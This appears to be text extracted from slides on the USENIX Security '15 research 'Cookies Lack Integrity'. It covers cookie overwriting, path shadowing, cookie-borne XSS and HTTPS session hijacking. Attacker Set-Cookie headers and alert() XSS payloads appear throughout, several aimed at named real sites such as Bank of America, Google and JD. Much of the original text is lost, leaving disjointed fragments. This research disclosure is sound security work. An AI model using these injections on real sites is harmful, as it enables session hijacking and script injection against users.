Cookie


NISL
zootrope

Cookies  Lack  Integrity:   Real--World  Implications
USENIX  Security  '15
Xiaofeng Zheng,  Jian Jiang,  Jinjin Liang,  Haixin Duan,   Shuo Chen,  Tao  Wan  and  Nicholas  Weaver
https://www.usenix.org/conference/usenixsecurity1 5/technical-- ses si ons /prese ntation/zheng

Cookie




Cookie

· HTTP/
· /
Server: Set--Cookie:  user=bob;   domain=.bank.com;  path=/;
JS: document.cookie="user=bob;   domain=.bank.com;  path=/;";

· /HTTP
Cookie:  user=bob; cart=books; JS:
console.log(document.cookie); à "user=bob;  cart=books;"



· 
[name,  domain,  path]Cookie

name, domain, pathCookie

HTTP
 Login

Set--Cookie:  session=secret;   domain=.bank.com;



path=/;

HTTP

Cookie:  session=secret; 

http://bank.com

 Cookie:  session=secret;

HTTPS

Set--Cookie:  session=secret;   domain=.bank.com; path=/;
HTTPS
Cookie:  session=secret;
X

https://bank.com

Cookie(SOP)

l Web  SOP:  [protocol, d  omain, p  ort] http://www.bank.com http://www.bank.com:8080 https://www.bank.com

SOP

l Cookie S  OP:  [domain, p  ath] - domain/path -  - HTTP / HTTPS
Cookie:  session=secret;  domain=.bank.com;  path=/; http://bank.com https://bank.com

CookieDomain

l Cookie""Domain

  http://www.bank.com  Set--Cookie:  user1=aaa;  domain=.bank.com;  path=/; Set--Cookie:  user2=bbb;   domain=www.bank.com;   path=/; Set--Cookie:  user3=ccc;  domain=.www.bank.com;  path=/; Set--Cookie:  user4=ddd;   domain=other.bank.com;   path=/;

   


 http://www.bank.com Cookie: user1=aaa;   user2=bbb;     user3=ccc;  
 http://user.bank.com Cookie: user1=aaa;  

CookiePath
Set--Cookie:  session=bob;       domain=.bank.com;         path=/;   Set--Cookie:  cart=books;          domain=.bank.com;   path=/buy/;  
http://bank.com/ Cookie:  session=bob;  
http://bank.com/buy/ Cookie:  session=bob;   cart=books;  

Cookie  in HTTPS

Set--Cookie:  session=bob;   domain=.bank.com; path=/;
HTTPS

https://bank.com

http://non.bank.com





Cookie: session=bob;

http://weibo.com <img src=`http://non.bank.com' />

Secure Flag

RFC:  SecureCookieHTTPS



Set--Cookie:  session=bob; domain=.bank.com;

path=/;   Secure;

https://bank.com

HTTPS

Cookie: session=bob ; 
X
http://non.bank.com

Secure  Flag:  
RFC 6265: Although   seemingly  useful  for  protecting  cookies  from  active  network attackers,   the  Secure  attribute  protects  only  the  cookie's confidentiality. An  active  network  attacker  can  overwrite Secure cookies  from   an  insecure  channel,   disrupting   their  integrity.
Set--Cookie: session=attacker; domain=.bank.com; path=/;

Cookie: session=bob;
(domain=.bank.com; path=/; Secure)
https://good.bank.com/

http://evil.bank.com/

Secure  Cookie

 Cookie:  session=bob;   domain=.bank.com;  
path=/;   Secure;
HTTPS
 Cookie:  session=attacker;

https://bank.com

HTTP
Set--Cookie:   session=attacker;  domain=.bank.com;  path=/;  Secure;


http://non.bank.com

CookieAuthenticated--as--Attacker
BARTH, A  .,  JACKSON,   C.,  Robust  De--fenses for  Cross--Site   Request  Forgery

Cookie
 · CookieHTML · JSCookieDOM/

CookieXSS

Amazon  Cloud

Set--Cookie:  inject=abc"+alert(`xss')+";   domain=.amazon.cn;  path=/;



Cookie


1""Cookie
· Cookie or 

· 
BOA
Cookie:  BA_0021=OLB boaMboxCreate("***",  '***','***','***','profile.BA_0021=OLB','***','***','***');
Cookie:  BA_0021=OLB'xss boaMboxCreate("***",  '***','***','***','profile.BA_0021=OLB#xss','***','***','***');
 function   boaMboxCreate()  { var argStr =  process(arguments); // eval("mboxCreate("  +  argStr +  ")"); }
Set--Cookie:  BA_0021=OLB\x27+alert(1)+\x27;  domain=.bankofamerica.com;  path=/;

2""Cookie
l 
Cookiename
l Cookie[name, d  omain, p  ath]
[name, domain, path]Cookie  / JSServername domainpathURL


Cookie

 Cookie:  session=bob;   domain=.user.bank.com;   https://user.bank.com
path=/;   Secure;
HTTP

Cookie:  session=bob; session=attacker;



Server

HTTP 

Set--Cookie:   session=attacker;  domain=.bank.com;  path=/;  Secure;

http://non.bank.com


Cookie
RFC"" CookieCookie
 ----RFC6265



CookieCookie 
----RFC6265 Cookie:  session=bob; session=attacker;
 
 ""

Server  &  Browser

Server/ PHP ASP/ASP.NET Java/Spring NodeJS GoLang Python
JS/ JQuery AngularJS ExtJS Dojo YUI



    

/
Cookie  String · PathCookie · PathCookie ----RFC6265
Cookie:  session=bob; session=attacker;

Path
https://user.bank.com/admin/index.php?type=1
Cookie:  session=attacker;  session=bob;
Server          à Set--Cookie:  session=bob;                   domain=.user.bank.com;          path=/; Attacker à Set--Cookie:  session=attacker;  domain=.bank.com;                              path=/admin; Server        à Set--Cookie:  session=bob;                   domain=.user.bank.com;          path=/admin; Attacker à Set--Cookie:  session=attacker;  domain=.bank.com;                              path=/admin/;
Cookie
Server          à Set--Cookie:  session=bob;                   domain=.user.bank.com;            path=/admin/; Attacker à Set--Cookie:  session=attacker;  domain=.bank.com;                              path=/admin/index.php;
Attacker à Set--Cookie:  session=attacker;  domain=.bank.com;                    path=/admin/index.php?type=1; (Firefox)


https://user.bank.com/
Server        à Set--Cookie:  session=bob;                   domain=.bank.com;   path=/;

Attacker à Set--Cookie:   session=none;                 domain=.bank.com;     

path=/;

Attacker à Set--Cookie:   session=attacker;    domain=user.bank.com;             path=/;

...

Server        à Set--Cookie:   session=bob;                  domain=.bank.com;         path=/;

expires=Mon,   1 Jan  1970

Cookie:  session=attacker;  session=bob; 

Attacker  à Set--Cookie:  session=attacker;   domain=user.bank.com;                    path=//; (Firefox)


· 
domainpath
· 
PathCreation--time
...



googleSet--Cookie: session=attacker; domain=www.google.com; path=/search;

Ajax:  https://www.google.com/search?pq=kcon



Cookie:  session=attacker;   session=bob;

https://www.google.com/
Cookie:  session=bob;



https://history.google.com/history/ 

https://mail.google.com/ https://drive.google.com/



3""HTTPS

https://www.bank.com

, Bob



 

HTTPS
HTTPS  



""

""HTTPS

https://www.bank.com

, Bob







GET  / Cookie:  Session=Bob;
Ajax: /message
Cookie:   Session=Alice;   session=Bob;
Ajax: /friends
Cookie:   Session=Jack;   session=Bob;

iframe:  /orders
Cookie:   Session=Jim;   session=Bob;

HTTPS



iframe:  /history
Cookie:   Session=Tom;   session=Bob;

gmail

https://mail.google.com/



https://gadget.google.com/chat

Attacker

Set--Cookie:  session=attacker; d  omain=gadget.google.com; p  ath=/chat;


 Attacker
Set--Cookie:  session=attacker;   domain=pay.jd.com;  path=/payment/bankChoose_Common.action;

HTTPS
· HTTPS"" · Ajax · Cookie

4""HTTPS
HTTPS

""HTTPS
HTTPS
/pay Cookie:  session=Bob;

 

/pay/order Cookie:  session=Attacker;

/chooseBank Cookie:  session=Attacker;



""HTTPS

""
HTTPS...

HTTPS
· "" · Ajax · Cookie
Amazon UnionPay JD Facebook Bitbucket OAuth ......

5Cookie
· Cookie
 Browser à Cookie:  user=bob;
Cookiedomain/path ...
Set--Cookie:  user=bob;   domain=?;   path=?;  ß Server domainpath


Github...

Cookie

......

https://sub.domain.bank.com/admin/users/list.php?name=1#any

Domains:

Paths:

.sub.domain.bank.com

/

sub.domain.bank.com

/admin

.domain.bank.com

/admin/

.bank.com

/ad                           (IE/Safari)

/admin/us (IE/Safari)

/admin/users/list.php?name=1#any (Firefox)



...

Set--Cookie:  session=attacker;   domain=.pay.jd.com;  path=/payment/;

...

https://pay.jd.com/payment/

HSTS

HSTS
HSTS:  HTTPS

strict--transport--security: max--age=15552000;  includeSubDomains; https://pay.bank.com

HTTPS

 HTTP

HTTPS

X

http://pay.bank.com

HSTSCookie

l HSTSCookie
Web includeSubdomains gmail mail.google.comincludeSubdomains
Cookie CookieDomain gmail mail.google.comincludeSubdomains non.google.comdomain.google.comCookie mail.google.com includeSubdomainsFull   HSTS

l 
Full  HSTS:    8/1000;     1252/1000000     (Alexa) IE11

Full  HSTS

407Pretty  Bad  Proxy
Pretty--Bad--Proxy:  An   Overlooked  Adversary  in  Browsers'  HTTPS  Deployments Shuo Chen,  Ziqing Mao

 CONNECT b  ank.com:443
200:  Connection   established

SSL/TLS

502:  Server  not   found
<script>.....</script> 

Proxy

https://bank.com
Fixed

407Firefox

407
 CONNECT b  ank.com:443

200:  Connection   established

407:  Proxy  Authentication   Required
 Set--Cookie: session=attack; ...

Proxy

https://bank.com

Full HSTS

CVE--2014--8639 CVE--2015--1229

6
Cookie


/Web WordPresswp_vul_path/vul.php Cookie http://a.com/wp_vul_path/vul.php http://b.com/wp_vul_path/vul.php http://c.com/wp_vul_path/vul.php
www.evil.com
Set--Cookie:  vulcookie=evil;  domain=.com;  path=/wp_vul_path/;
TLD  Cookie

Blind  Cookie  Attack  (Safari)

DNS  Query:  com DNS  Response:  1.1.1.1
http://com/

1.1.1.1

Set--Cookie:  vulcookie=evil;  domain=.com;  path=/wp--vul--path/;

http://a.com/wp--vul--path http://b.com/wp--vul--path http://c.com/wp--vul--path

Cookie  BREACH
· Cookie B  REACH
phpMyAdmin(CVE--2015--2206)

Cookie: nickname=Bob

Hello, Bob ... Password:CaiBuDao

Gzip

Cookie: nickname=Password:A

Hello, Password:A ... Password:CaiBuDao

 : 1024

Cookie: nickname=Password:C

Hello, Password:C ... Password:CaiBuDao

 : 1023

https://bank.com C

Cookie
· 
­ SOP
· 
­ 
· Cookie
­ XSS/SQLi
· Cookie
­ 
· Cookie""HTTPS
­ 
· Cookie""HTTPS
­ 
· CookieServer
­ 
· Cookie
­ BREACH/DNS Binding





WIFICookie J  

